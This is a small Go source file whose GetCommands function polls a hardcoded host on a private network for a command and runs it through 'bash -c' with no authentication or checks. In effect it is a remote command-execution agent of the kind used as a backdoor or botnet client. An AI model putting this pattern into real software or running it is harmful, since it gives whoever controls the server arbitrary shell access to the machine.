package functions

import (
	logger "activeNow/log"
	"encoding/json"
	"fmt"
	"net/http"
	"os/exec"
	"strings"
)

type Commands struct {
	Instrution string `json:"command"`
}

const manager = "http://192.168.1.14:7654"

func GetCommands() {
	resp, err := http.Get(manager + "/getCommands")
	if err != nil {
		logger.Log(err.Error(), true)
		return
	}
	defer resp.Body.Close()

	var command Commands
	err = json.NewDecoder(resp.Body).Decode(&command)
	if err != nil {
		logger.Log(err.Error(), true)
		return
	}
	commandExec := strings.TrimSpace(command.Instrution)
	fmt.Println(commandExec)

	if commandExec != "null" {
		cmd := exec.Command("bash", "-c", commandExec)
		output, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Println("failed to execute command: %v", err)
		}
		fmt.Println(string(output))
	}

}
